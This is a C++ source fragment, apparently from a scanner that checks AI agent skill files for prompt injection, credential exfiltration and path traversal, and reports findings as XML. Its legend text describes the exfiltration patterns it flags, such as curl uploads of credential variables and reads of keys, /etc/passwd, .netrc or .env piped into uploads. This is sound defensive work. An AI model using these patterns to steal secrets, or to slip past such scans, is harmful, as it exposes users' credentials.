    if( std::find( std::begin( kShellDotfiles ), std::end( kShellDotfiles ), base ) != std::end( kShellDotfiles ) )
    {
        return SkillFileKind::ShellScript;
    }
    constexpr std::string_view kShells[] = { "sh", "bash", "zsh", "dash", "ksh", "ash", "mksh" };
    if( extIs( { "sh", "bash", "zsh", "ksh" } ) || std::find( std::begin( kShells ), std::end( kShells ), interpreter ) != std::end( kShells ) )
    {
        return SkillFileKind::ShellScript;
    }
    if( skillTextAfterBom( text ).starts_with( "#!" ) || extIs( { "py", "js", "mjs", "cjs", "jsx", "ts", "mts", "cts", "tsx", "rb", "pl", "pm", "lua", "php", "ps1", "psm1", "psd1", "bat", "cmd" } ) )
    {
        return SkillFileKind::OtherCode;
    }
    return SkillFileKind::Markdown;
}

// scanSkillTextOn on one thread with a kSkillScanStackBytes stack (a reservation: pages commit only as deep as a match
// recurses), so a long skill line gets the bound that stack affords instead of the caller's. A thread the system refuses
// runs the scan on the caller at kCallerStackBytesFloor, disclosed by stackthreads.h. A throw out of the scan (an
// allocation failure) cannot leave the thread, so it becomes one CRITICAL scan-aborted finding: a skill whose scan did
// not finish never reads clean.
// A ShellScript gets BOTH passes, merged by mergeScriptPasses (below): a (line, rule) both passes report keeps the WORSE
// severity, the markdown row on a tie, so every markdown finding survives byte for byte unless the code pass graded the
// same (line, rule) higher — script mode can only ADD rows or RAISE one, never quiet one. (Taking the code pass alone would not be
// monotone: the joined-body injection pass reports only the FIRST hit per pattern, and code mode feeds it lines an
// example fence withheld, which could move that first hit off the line the markdown pass reported.)
// Merge a shell script's whole-file-code pass into its markdown pass: stable-sorted on (line, rule, severity WORST first),
// then deduped keeping the first — so a (line, rule) both passes report keeps the higher severity, and the markdown row
// (inserted first) on a tie. Keeping the first row per (line, rule) without the severity key would let a WARN from the
// markdown pass hide a CRITICAL the code pass graded on the same line, and quiet the exit from 2 to 1 (a wrap that
// stops refusing). Today every rule's severity is a function of the line alone, so the key only ever breaks ties; it
// is the invariant, not a behaviour change, and the skillscan gate's merge arm holds it.
inline void mergeScriptPasses( std::vector<SkillFinding>& findings, std::vector<SkillFinding> code )
{
    findings.insert( findings.end(), std::make_move_iterator( code.begin() ), std::make_move_iterator( code.end() ) );
    dedupeFindingsKeepWorst( findings );
}

inline std::vector<SkillFinding> scanSkillText( std::string_view text, SkillFileKind kind = SkillFileKind::Markdown )
{
    std::vector<SkillFinding> findings;
    const auto scan = [ & ]( std::size_t settledBytes )
    {
        try
        {
            findings = scanSkillTextOn( text, settledBytes );
            if( kind == SkillFileKind::ShellScript )
            {
                mergeScriptPasses( findings, scanSkillTextOn( text, settledBytes, /*wholeFileIsCode=*/true ) );
            }
        }
        catch( ... )
        {
            findings = std::vector<SkillFinding>( 1, SkillFinding{ SkillSeverity::Critical, 0, detail::kScanIncompleteRuleAborted, "the scan stopped before it finished" } );
            DISCLOSE( "skillscan: the scan threw before it finished — reported as a CRITICAL scan-aborted finding" );
        }
    };
    runOnStackThreads( 1, kSkillScanStackBytes, scan );
    return findings;
}


// ── file and directory entry points ──────────────────────────────────────────────────────────────

// Result of a checked scan: distinguishes "read the file, ran the scan, got N findings" (possibly
// zero — a legitimate clean scan) from "never scanned it — the path itself could not be read" (missing,
// permission-denied, or a directory). Every entry point needs the two apart: --scan-skill refuses an
// unreadable path (§P0.5a — a typo'd path must never read as "safe"), and the two directory walks
// (--scan-skills, wrap.h's wrapScanSkillDir) score a file they found but could not read CRITICAL
// (kScanIncompleteRuleUnreadable). The unchecked scanSkillFile() that read "cannot scan" as "nothing
// found" for wrap.h is gone for that reason.
struct SkillFileReadResult
{
    bool                        readable = false;   // false = path could not be scanned at all
    std::vector<SkillFinding>   findings;            // valid only when readable == true
    SkillFileKind               kind     = SkillFileKind::Markdown;   // OtherCode: counted as code_not_flow_scanned
};

// NO DISCLOSE on the unreadable paths here, deliberately, and it is not an omission (M7/F20,
// capture-audit 2026-09-04). That log line means "this run CONTINUED in a reduced mode"; every caller of
// THIS function refuses or scores the file CRITICAL by name instead, so the alert would stamp a
// deduplicated, pathless degrade notice beside a disclosure that already says which file and why.
inline SkillFileReadResult scanSkillFileChecked( const std::string& path )
{
    std::error_code ec;
    if( std::filesystem::is_directory( path, ec ) )
    {
        return {};
    }
    std::ifstream f( path );
    if( !f )
    {
        return {};
    }
    std::ostringstream buf;
    buf << f.rdbuf();
    if( f.bad() )
    {
        return {};
    }
    const std::string   text = buf.str();
    const SkillFileKind kind = skillFileKindOf( path, text );
    return { true, scanSkillText( text, kind ), kind };   // empty file → empty findings → a legitimate clean scan
}

// NOTE: directory scanning (recursive .md discovery + per-file scan + exit-code aggregation) is
// done by the --scan-skills call site in main.cpp, not here — it needs per-file printing as it
// walks, which a `vector<SkillFinding>` with no file attribution cannot support. A prior
// `scanSkillDir()` duplicated that walk and returned findings with no path field (traceable to no
// file); it was unused (main.cpp never called it) and unusable, so it was removed rather than fixed.

// ── exit-code helper ──────────────────────────────────────────────────────────────────────────────

// 2 if any Critical, else 1 if any Warn, else 0.
inline int skillScanExitCode( const std::vector<SkillFinding>& findings ) noexcept
{
    int code = 0;
    for( const SkillFinding& f : findings )
    {
        if( f.sev == SkillSeverity::Critical )
        {
            return 2;
        }
        if( f.sev == SkillSeverity::Warn && code < 1 )
        {
            code = 1;
        }
    }
    return code;
}

// ── §P6.9 stdout artifact ─────────────────────────────────────────────────────────────────────────
//
// --scan-skill/--scan-skills were the only two verbs with no deterministic stdout artifact: on a CLEAN
// scan (the common case — vetting a skill before install) stdout was byte-empty, and even a dirty scan
// only got ad-hoc human-readable lines with no header a caller could parse for counts. Every OTHER verb
// in this tool emits exactly one well-formed document (XML, or markdown for --report/--recall) to stdout;
// this brings skillscan in line with a small, capped, deterministic `<skillscan>` element. stderr's tally
// line and the 0/1/2 verdict / 3 refusal exit codes are UNCHANGED (test/skillscanreadcheck.sh pins the
// refusal path — this artifact is emitted ONLY on the printSkillScanArtifact call sites, which sit strictly
// after the refusal `return 3`s in main.cpp, so a refused scan still has byte-empty stdout; test/skillscan.sh
// pins the verdicts, which are computed exactly as before).

constexpr std::size_t kSkillScanFindingCap = 200;   // generous for one file or a small dir; caps a pathological --scan-skills sweep

// minimal attribute-value XML escape. skillscan.h is intentionally dependency-light (it runs BEFORE the
// heavy ingest pipeline main.cpp defers to for everything else — see the call site comment), so this does
// not pull in serialize.h's escapeXml for one small attribute; paths here are filesystem paths, not
// arbitrary source text, so the 4-case table is enough (no CDATA/UTF-8-scrub machinery needed).
inline std::string escapeXmlAttr( std::string_view s )
{
    std::string out;
    out.reserve( s.size() );
    for( char c : s )
    {
        switch( c )
        {
            case '&':  out += "&amp;";  break;
            case '<':  out += "&lt;";   break;
            case '>':  out += "&gt;";   break;
            case '"':  out += "&quot;"; break;
            default:   out += c;        break;
        }
    }
    return out;
}

// one (path, finding) pair — the flattened cross-file record printSkillScanArtifact prints from. A plain
// value type (not a pointer into the caller's per-file vectors) so the artifact can be built by accumulating
// across a whole --scan-skills directory walk without lifetime games.
struct SkillScanRow
{
    std::string  path;
    SkillFinding finding;
};

// Lowercase, unpadded XML attribute form of a severity ("critical"/"warn"/"info") — DERIVED from
// skillSeverityStr (the single source of truth wrap.h's plain-text display already uses) rather than
// restating the SkillSeverity->name mapping in a second switch, which the clone detector correctly flags
// as a near-duplicate of skillSeverityStr's. skillSeverityStr pads with trailing spaces for column
// alignment ("WARN    "); stop at the first space to strip that padding.
inline std::string skillSeverityAttr( SkillSeverity s )
{
    std::string out;
    for( const char c : std::string_view( skillSeverityStr( s ) ) )
    {
        if( c == ' ' )
        {
            break;
        }
        out += char( std::tolower( static_cast<unsigned char>( c ) ) );
    }
    return out;
}

// Emit `<skillscan files=".." findings=".." [skipped=".."] [shown=".." capped="1"] verdict="clean|warn|critical">`
// + one `<f p="path:line" rule=".." sev=".."/>` per finding (capped at kSkillScanFindingCap), `</skillscan>`.
// Deterministic: rows print in the caller's existing (file, line, rule) order — never re-sorted here.
// `verdict=` is derived from the SAME severities as skillScanExitCode (0/1/2 <-> clean/warn/critical), so
// it can never disagree with the exit code the caller separately returns.
//
// §B13.3: `filesSkipped` is how many files the caller's walk SAW and could not scan (unreadable — each also
// carries a CRITICAL SCAN-INCOMPLETE:file-unreadable row) — the other half of the population `files=` counts. A verdict must not be silently narrower
// than its subject, and "clean" over a directory whose executables were never opened is exactly that.
// Emitted only when non-zero (the house rule: absent = nothing skipped, so every existing artifact and gate
// stays byte-identical), and defaulted so the single-file entry point — which scans the one file it is given
// and skips nothing — needs no change.
//
// t14-cleanup #1: this verb never wrote an XML comment at all — compactlegend.h's "skillscan" dictionary
// entry covers the compact/default posture (scanned and matched by attribute name, independent of anything
// this function writes), but --legend=full had nothing to match against, so files=/findings=/skipped=/
// verdict= were undefined debt on every --legend=full run (legendcoverage_baseline.txt's four
// `scan-skills | skillscan@*` lines). `fullLegend=true` (only when cfg.legend=="full") writes the missing
// comment; false (every existing caller) is byte-identical.
//
// #353: an EXFILTRATE:net-exfil row graded by more than its match carries why= — why="no-cred-source" on a WARN,
// why="sensitive-read-upload" on a CRITICAL fed by a sensitive read. The full legend defines it only when a row carries
// it, so every scan without one stays byte-identical.
// The <skillscan> root's counts. codeNotFlowScanned (readable SkillFileKind::OtherCode files) and dirs (a bare --scan-skills
// only: the directories it walked, ';'-separated) are present-only, so an answer without them is byte-identical to before.
struct SkillScanTally
{
    int         filesScanned       = 0;
    int         filesSkipped       = 0;
    int         codeNotFlowScanned = 0;
    std::string dirs;
};

// The --legend=full prose for <skillscan>: its present-only clauses (f rows, capped=, code_not_flow_scanned=, why=) ride only when
// the answer carries the attribute, so a scan without them prints the legend it always printed.
inline void printSkillScanFullLegend( std::FILE* out, const std::vector<SkillScanRow>& rows, const SkillScanTally& tally ) noexcept
{
    const bool anyWhy  = std::any_of( rows.begin(), rows.end(), []( const SkillScanRow& r ) noexcept { return r.finding.why != nullptr; } );
    const bool anyDest  = std::any_of( rows.begin(), rows.end(), []( const SkillScanRow& r ) noexcept { return !r.finding.dest.empty(); } );
    const bool anyOwner = std::any_of( rows.begin(), rows.end(), []( const SkillScanRow& r ) noexcept { return !r.finding.owner.empty(); } );
    rw::emitTo( out, "<!-- ripwire scan-skills: injection/exfiltration/path-traversal scan of skill files. "
                      "files=N files scanned; skipped=N of them unreadable (absent = none, each also carries "
                      "its own CRITICAL SCAN-INCOMPLETE:file-unreadable finding row). findings=N pattern hits; "
                      "rows print up to {} (shown=/capped=\"1\" past that). verdict=clean|warn|critical is the "
                      "worst finding's severity, the same read as the exit code (0/1/2).{}{}{}{}{}{}{} -->", kSkillScanFindingCap,
                      tally.dirs.empty() ? "" : " dirs= (a bare scan only) lists the directories it walked, separated by ';': .agents/skills under "
                                                "the current directory, then the Claude and Codex skill homes (a missing one holds nothing); "
                                                "the positional root is never read.",
                      rows.empty() ? "" : " An f row is one finding: p= is path:line (line 0 = the file or walk as a whole), rule= is "
                                          "CATEGORY:name (INJECTION, EXFILTRATE, SCOPE-CREEP, FRONTMATTER, SCAN-INCOMPLETE), sev= is "
                                          "critical|warn|info.",
                      rows.size() > kSkillScanFindingCap ? " capped=1 (present only then): the rows shown are the worst severity first (every "
                                                           "CRITICAL row, then WARN), each severity in scan order, so the cap never hides a "
                                                           "CRITICAL row behind WARN rows." : "",
                      tally.codeNotFlowScanned > 0 ? " code_not_flow_scanned=N (present only then): N scanned files are code in a language this "
                                               "scanner has no network-flow model for (.py .js .mjs .cjs .jsx .ts .mts .cts .tsx .rb .pl .pm .lua .php .ps1 .psm1 .psd1 .bat .cmd, or a non-shell #!); "
                                               "they were read line by line like markdown, so an upload of a secret written in that language "
                                               "is not detected: clean does not cover them. Shell scripts are scanned as code." : "",
                      anyWhy ? " An f row's why= says why EXFILTRATE:net-exfil graded as it did: why=no-cred-source, a network "
                               "verb plus a $VAR or base64 but no credential-shaped source on the line, so WARN, not CRITICAL; "
                               "why=sensitive-read-upload, a sensitive file read (a key, /etc/passwd, .netrc, .env, a credential "
                               "or cookie store) piped, redirected or passed into an upload, CRITICAL; why=local-dest, a credential "
                               "variable sent by bare curl over HTTP(S) only to localhost, 127/8, ::1 or a private-LAN host (10/8, "
                               "172.16/12, 192.168/16) spelled canonically, following no redirect, in a document with no relay, "
                               "forward, proxy, curl config or shadowed curl (a heuristic list, not a proof), WARN. Any other "
                               "credential row is CRITICAL." : "",
                      anyDest ? " dest= (net-exfil rows, present only then) lists the hosts the line's curl commands send to, "
                                "space-separated, when every one is proved: a literal URL, or a $VAR this document assigns exactly once, "
                                "to a literal, in an assignment that always runs, before the line. It is where the URLs point, not proof of the last hop (a relay or proxy "
                                "set elsewhere in the file can carry the request on). Absent = a host could not be proved (an unresolved "
                                "$VAR, an unquoted $VAR that could split, a proxy option or VAR=x prefix, another network verb), "
                                "and why=local-dest was not granted on it." : "",
                      anyOwner ? " owner= (CRITICAL credential rows, present only then) names the service whose name the line's "
                                 "credential variables carry and which owns every dest= host (cloudflare, github, airtable). For triage "
                                 "only: the row stays CRITICAL, because a token sent to its own service can still move data to an "
                                 "account, repository or invite an attacker controls there." : "" );
}

// The <f> rows an answer shows, in order: every row in scan order, except past the row cap, where the worst severity comes
// first — one pass per severity, CRITICAL down to INFO, each in scan order — so a WARN flood cannot push the CRITICAL
// evidence row past the cap (review S1). Uncapped answers keep scan order, byte-identical to before.
template<class Fn>
inline void forEachShownSkillRow( const std::vector<SkillScanRow>& rows, std::size_t shown, bool capped, Fn&& fn )
{
    if( !capped )
    {
        for( const SkillScanRow& r : rows )
        {
            fn( r );
        }
        return;
    }
    std::size_t printed = 0;
    for( const SkillSeverity sev : { SkillSeverity::Critical, SkillSeverity::Warn, SkillSeverity::Info } )
    {
        for( std::size_t i = 0; i < rows.size() && printed < shown; ++i )
        {
            if( rows[i].finding.sev == sev )
            {
                fn( rows[i] );
                ++printed;
            }
        }
    }
}

// One <f p= rule= sev= [why=] [dest=] [owner=]/> row.
inline void printSkillScanRow( std::FILE* out, const SkillScanRow& r ) noexcept
{
    rw::emitTo( out, "<f p=\"{}:{}\" rule=\"{}\" sev=\"{}\"",
                 escapeXmlAttr( r.path ).c_str(), r.finding.line, r.finding.rule, skillSeverityAttr( r.finding.sev ).c_str() );
    if( r.finding.why != nullptr )
    {
        rw::emitTo( out, " why=\"{}\"", r.finding.why );
    }
    if( !r.finding.dest.empty() )
    {
        rw::emitTo( out, " dest=\"{}\"", escapeXmlAttr( r.finding.dest ) );
    }
    if( !r.finding.owner.empty() )
    {
        rw::emitTo( out, " owner=\"{}\"", r.finding.owner );
    }
    rw::emitRaw( out, "/>" );
}

inline void printSkillScanArtifact( std::FILE* out, const std::vector<SkillScanRow>& rows, const SkillScanTally& tally, bool fullLegend ) noexcept
{
    const int filesScanned = tally.filesScanned, filesSkipped = tally.filesSkipped, codeNotFlowScanned = tally.codeNotFlowScanned;
    if( fullLegend )
    {
        printSkillScanFullLegend( out, rows, tally );
    }
    int maxSev = 0;
    for( const SkillScanRow& r : rows )
    {
        if( int( r.finding.sev ) > maxSev )
        {
            maxSev = int( r.finding.sev );
        }
    }
    const char* verdict = maxSev == 2 ? "critical" : ( maxSev == 1 ? "warn" : "clean" );

    const std::size_t total  = rows.size();
    const std::size_t shown  = total < kSkillScanFindingCap ? total : kSkillScanFindingCap;
    const bool         capped = shown < total;

    rw::emitTo( out, "<skillscan files=\"{}\" findings=\"{}\"", filesScanned, total );
    if( filesSkipped > 0 )
    {
        rw::emitTo( out, " skipped=\"{}\"", filesSkipped );
    }
    if( capped )
    {
        rw::emitTo( out, " shown=\"{}\" capped=\"1\"", shown );
    }
    if( codeNotFlowScanned > 0 )
    {
        rw::emitTo( out, " code_not_flow_scanned=\"{}\"", codeNotFlowScanned );
    }
    if( !tally.dirs.empty() )
    {
        rw::emitTo( out, " dirs=\"{}\"", escapeXmlAttr( tally.dirs ) );
    }
    rw::emitTo( out, " verdict=\"{}\">", verdict );
    forEachShownSkillRow( rows, shown, capped, [ & ]( const SkillScanRow& r ) { printSkillScanRow( out, r ); } );
    rw::emitRaw( out, "</skillscan>\n" );
}

}   // namespace rw
